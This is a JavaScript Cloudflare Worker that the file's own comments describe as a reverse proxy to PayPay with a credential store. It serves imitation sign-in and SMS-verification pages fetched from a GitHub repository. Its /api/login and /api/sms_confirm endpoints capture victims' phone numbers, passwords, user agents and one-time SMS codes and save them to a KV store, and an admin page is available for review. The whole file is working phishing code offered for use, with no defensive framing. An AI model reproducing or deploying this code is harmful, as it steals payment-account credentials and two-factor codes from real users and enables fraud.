// Cloudflare Worker — reverse proxy to PayPay + credential store
// KV binding: CREDS
// /admin で管理画面
// 16文字IDパスは既存の docs/signin.html を配信
// /api/login で credential を KV に保存して sms.html へリダイレクト

const TARGET_ORIGIN = "https://www.paypay.ne.jp";
const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
const SIGNIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signin.html";
const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/sms.html";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname === "/admin" || url.pathname === "/admin.html") {
      return fetchStatic(ADMIN_SOURCE);
    }

    if (url.pathname === "/signin.html" || url.pathname === "/signin") {
      return fetchStatic(SIGNIN_SOURCE);
    }

    if (url.pathname === "/sms.html" || url.pathname === "/sms") {
      return fetchStatic(SMS_SOURCE);
    }

    if (url.pathname === "/api/login" && request.method === "POST") {
      let body = {};
      try { body = await request.json(); } catch {}
      const captured = {
        type: "login",
        phone: body.phone || body.username || null,
        password: body.password || null,
        ts: new Date().toISOString(),
        ua: request.headers.get("User-Agent") || "",
      };
      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
      await env.CREDS.put(key, JSON.stringify(captured));
      return json({ status: "sms_required" });
    }

    if (url.pathname === "/api/sms_confirm" && request.method === "POST") {
      let body = {};
      try { body = await request.json(); } catch {}
      const captured = {
        type: "sms_confirm",
        code: body.code || null,
        ts: new Date().toISOString(),
      };
      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
      await env.CREDS.put(key, JSON.stringify(captured));
      return json({ status: "ok" });
    }

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    const pathParts = url.pathname.split("/").filter(Boolean);
    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
      return fetchStatic(SIGNIN_SOURCE);
    }

    return new Response("Not found", { status: 404 });
  },
};

async function fetchStatic(source) {
  try {
    const res = await fetch(source);
    if (res.ok) {
      return new Response(await res.text(), {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }
  } catch {}
  return new Response("Fetch failed", { status: 502 });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
